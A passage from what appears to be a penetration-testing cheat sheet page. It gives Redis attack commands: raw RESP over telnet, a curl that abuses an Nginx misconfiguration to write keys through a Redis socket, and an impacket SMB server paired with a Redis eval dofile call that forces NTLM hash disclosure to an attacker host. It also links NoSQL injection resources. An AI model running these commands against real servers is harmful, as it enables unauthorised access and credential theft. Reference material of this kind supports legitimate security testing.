<span class="o">&gt;</span> lpush myword <span class="s2">"abracadabra"</span>

<span class="c">#RESP Format</span>
telnet 10.0.0.1 6379
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
<span class="k">*</span>3
<span class="nv">$3</span>
<span class="nb">set</span>
<span class="nv">$4</span>
name
<span class="nv">$4</span>
john
</code></pre></div>  </div>

  <h3 id="nginx-missconfig">Nginx missconfig</h3>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># HSET &lt;key&gt; &lt;field&gt; &lt;value&gt;</span>
curl <span class="nt">-X</span> <span class="s2">"HSET"</span> https://example.com/unix:/path/to/redis.sock:&lt;key&gt;%20&lt;field&gt;%20&lt;value&gt;%20/abc
</code></pre></div>  </div>

  <h3 id="ntlm-hash-disclosure">NTLM Hash Disclosure</h3>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>share
<span class="nb">sudo </span>impacket-smbserver share ./share/ <span class="nt">-smb2support</span>
<span class="o">&gt;</span> <span class="nb">eval</span> <span class="s2">"dofile('//10.0.0.1/share')"</span> 0
</code></pre></div>  </div>
</details>

<!----------------------------------------------------------NoSQL---------------------------------------------------------------->

<details>
  <summary>NoSQL (Resources)</summary>
  <p></p>

  <h2 id="online-resources">Online Resources</h2>

  <ul>
    <li><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">Hacktricks</a></li>
    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadsAllTheThings</a></li>
    <li><a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt">MongoDB Payloads</a></li>
    <li><a href="http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html">MongoDB Pentest</a></li>
    <li><a href="https://nullsweep.com/nosql-injection-cheatsheet/">Injection CheatSheet 1</a></li>
    <li><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">Injection CheatSheet 2</a></li>
    <li><a href="https://www.infoq.com/articles/nosql-injections-analysis/">Injection CheatSheet 3</a></li>
    <li><a href="https://rdsec.net/securec0ding/2019/NoSQL_Injection.html">Injection CheatSheet 4</a></li>
    <li><a href="https://www.stjoern.com/menu-db/nosql">Injection CheatSheet 5</a></li>
    <li><a href="https://securityintelligence.com/does-nosql-equal-no-injection/">Injection CheatSheet 6</a></li>
    <li><a href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">Blog part1</a></li>
    <li><a href="https://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html">Blog part2</a></li>
  </ul>

</details>

          </div>
        </div>
      </div>
    </main>

    <div class="system-info">
      <div class="terminal-time"></div>
      <div class="location-info"></div>
    </div>
  </div>

  <script src="/assets/js/main.js"></script>
</body>
</html>